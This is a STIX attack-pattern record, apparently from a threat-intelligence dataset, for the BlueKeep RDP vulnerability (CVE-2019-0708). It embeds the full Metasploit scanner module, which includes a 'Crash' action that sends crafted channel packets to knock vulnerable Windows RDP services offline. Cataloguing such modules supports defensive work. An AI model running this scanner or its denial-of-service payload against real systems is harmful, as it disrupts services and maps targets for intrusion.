{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--05789621-7e9e-4d7d-ba5f-d4a7f537f49b",
    "created": "2024-08-14T16:26:30.986739Z",
    "modified": "2024-08-14T16:26:30.986743Z",
    "name": "CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb",
            "external_id": "cve_2019_0708_bluekeep.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-0708"
        },
        {
            "source_name": "reference",
            "url": "https://msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708"
        },
        {
            "source_name": "reference",
            "url": "https://zerosum0x0.blogspot.com/2019/05/avoiding-dos-how-bluekeep-scanners-work.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::RDP\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check',\n        'Description' => %q{\n          This module checks a range of hosts for the CVE-2019-0708 vulnerability\n          by binding the MS_T120 channel outside of its normal slot and sending\n          non-DoS packets which respond differently on patched and vulnerable hosts.\n          It can optionally trigger the DoS vulnerability.\n        },\n        'Author' =>\n          [\n            'National Cyber Security Centre', # Discovery\n            'JaGoTu', # Module\n            'zerosum0x0', # Module\n            'Tom Sellers' # TLS support, packet documenentation, DoS implementation\n          ],\n        'References' =>\n          [\n            [ 'CVE', '2019-0708' ],\n            [ 'URL', 'https://msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708' ],\n            [ 'URL', 'https://zerosum0x0.blogspot.com/2019/05/avoiding-dos-how-bluekeep-scanners-work.html' ]\n          ],\n        'DisclosureDate' => '2019-05-14',\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          ['Scan', 'Description' => 'Scan for exploitable targets'],\n          ['Crash', 'Description' => 'Trigger denial of service vulnerability'],\n        ],\n        'DefaultAction' => 'Scan',\n        'Notes' =>\n          {\n            'Stability' => [ CRASH_SAFE ],\n            'AKA' => ['BlueKeep']\n          }\n      )\n    )\n  end\n\n  def report_goods\n    report_vuln(\n      host: rhost,\n      port: rport,\n      proto: 'tcp',\n      name: name,\n      info: 'Behavior indicates a missing Microsoft Windows RDP patch for CVE-2019-0708',\n      refs: references\n    )\n  end\n\n  def run_host(ip)\n    # Allow the run command to call the check command\n\n    status = check_host(ip)\n    if status == Exploit::CheckCode::Vulnerable\n      print_good(status[1].to_s)\n    elsif status == Exploit::CheckCode::Safe\n      vprint_error(status[1].to_s)\n    else\n      vprint_status(status[1].to_s)\n    end\n\n    status\n  end\n\n  def rdp_reachable\n    rdp_connect\n    rdp_disconnect\n    return true\n  rescue Rex::ConnectionRefused\n    return false\n  rescue Rex::ConnectionTimeout\n    return false\n  end\n\n  def check_host(_ip)\n    # The check command will call this method instead of run_host\n    status = Exploit::CheckCode::Unknown\n\n    begin\n      begin\n        rdp_connect\n      rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError\n        return Exploit::CheckCode::Safe('The target service is not running or refused our connection.')\n      end\n\n      status = check_rdp_vuln\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError, ::TypeError => e\n      bt = e.backtrace.join(\"\\n\")\n      vprint_error(\"Unexpected error: #{e.message}\")\n      vprint_line(bt)\n      elog(e)\n    rescue RdpCommunicationError\n      vprint_error('Error communicating RDP protocol.')\n      status = Exploit::CheckCode::Unknown\n    rescue Errno::ECONNRESET\n      vprint_error('Connection reset')\n    rescue StandardError => e\n      bt = e.backtrace.join(\"\\n\")\n      vprint_error(\"Unexpected error: #{e.message}\")\n      vprint_line(bt)\n      elog(e)\n    ensure\n      rdp_disconnect\n    end\n\n    status\n  end\n\n  def check_for_patch\n    begin\n      6.times do\n        _res = rdp_recv\n      end\n    rescue RdpCommunicationError\n      # we don't care\n    end\n\n    # The loop below sends Virtual Channel PDUs (2.2.6.1) that vary in length\n    # The arch governs which of the packets triggers the desired response\n    # which is an MCS Disconnect Provider Ultimatum or a timeout.\n\n    # Disconnect Provider message of a valid size for each platform\n    # has proven to be safe to send as part of the vulnerability check.\n    x86_string = '00000000020000000000000000000000'\n    x64_string = '0000000000000000020000000000000000000000000000000000000000000000'\n\n    if action.name == 'Crash'\n      vprint_status('Sending denial of service payloads')\n      # Length and chars are arbitrary but total length needs to be longer than\n      # 16 for x86 and 32 for x64. Making the payload too long seems to cause\n      # the DoS to fail. Note that sometimes the DoS seems to fail. Increasing\n      # the payload size and sending more of them doesn't seem to improve the\n      # reliability. It *seems* to happen more often on x64, I haven't seen it\n      # fail against x86. Repeated attempts will generally trigger the DoS.\n      x86_string += 'FF' * 1\n      x64_string += 'FF' * 2\n    else\n      vprint_status('Sending patch check payloads')\n    end\n\n    chan_flags = RDPConstants::CHAN_FLAG_FIRST | RDPConstants::CHAN_FLAG_LAST\n    channel_id = [1005].pack('S>')\n    x86_packet = rdp_build_pkt(build_virtual_channel_pdu(chan_flags, [x86_string].pack('H*')), channel_id)\n\n    x64_packet = rdp_build_pkt(build_virtual_channel_pdu(chan_flags, [x64_string].pack('H*')), channel_id)\n\n    6.times do\n      rdp_send(x86_packet)\n      rdp_send(x64_packet)\n\n      # A single pass should be sufficient to cause DoS\n      if action.name == 'Crash'\n        sleep(1)\n        rdp_disconnect\n\n        sleep(5)\n        if rdp_reachable\n          print_error(\"Target doesn't appear to have been crashed. Consider retrying.\")\n          return Exploit::CheckCode::Unknown\n        else\n          print_good('Target service appears to have been successfully crashed.')\n          return Exploit::CheckCode::Vulnerable('The target appears to have been crashed by disconnecting from an incorrectly-bound MS_T120 channel.')\n        end\n      end\n\n      # Quick check for the Ultimatum PDU\n      begin\n        res = rdp_recv(-1, 1)\n      rescue EOFError\n        # we don't care\n      end\n      return Exploit::CheckCode::Vulnerable('The target attempted cleanup of the incorrectly-bound MS_T120 channel.') if res&.include?(['0300000902f0802180'].pack('H*'))\n\n      # Slow check for Ultimatum PDU. If it doesn't respond in a timely\n      # manner then the host is likely patched.\n      begin\n        4.times do\n          res = rdp_recv\n          # 0x2180 = MCS Disconnect Provider Ultimatum PDU - 2.2.2.3\n          if res.include?(['0300000902f0802180'].pack('H*'))\n            return Exploit::CheckCode::Vulnerable('The target attempted cleanup of the incorrectly-bound MS_T120 channel.')\n          end\n        end\n      rescue RdpCommunicationError\n        # we don't care\n      end\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def check_rdp_vuln\n    # check if rdp is open\n    is_rdp, version_info = rdp_fingerprint\n    unless is_rdp\n      vprint_error('Could not connect to RDP service.')\n      return Exploit::CheckCode::Unknown\n    end\n    rdp_disconnect\n    rdp_connect\n    is_rdp, server_selected_proto = rdp_check_protocol\n\n    requires_nla = [RDPConstants::PROTOCOL_HYBRID, RDPConstants::PROTOCOL_HYBRID_EX].include? server_selected_proto\n    product_version = (version_info && version_info[:product_version]) ? version_info[:product_version] : 'N/A'\n    info = \"Detected RDP on #{peer} (Windows version: #{product_version})\"\n\n    service_info = \"Requires NLA: #{(!version_info[:product_version].nil? && requires_nla) ? 'Yes' : 'No'}\"\n    info << \" (#{service_info})\"\n\n    vprint_status(info)\n\n    if requires_nla\n      vprint_status('Server requires NLA (CredSSP) security which mitigates this vulnerability.')\n      return Exploit::CheckCode::Safe\n    end\n\n    chans = [\n      ['cliprdr', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],\n      ['MS_T120', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_COMPRESS_RDP],\n      ['rdpsnd', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP],\n      ['snddbg', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP],\n      ['rdpdr', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_COMPRESS_RDP],\n    ]\n\n    success = rdp_negotiate_security(chans, server_selected_proto)\n    return Exploit::CheckCode::Unknown unless success\n\n    rdp_establish_session\n\n    result = check_for_patch\n\n    if result == Exploit::CheckCode::Vulnerable\n      report_goods\n    end\n\n    # Can't determine, but at least we know the service is running\n    result\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-05-14"
}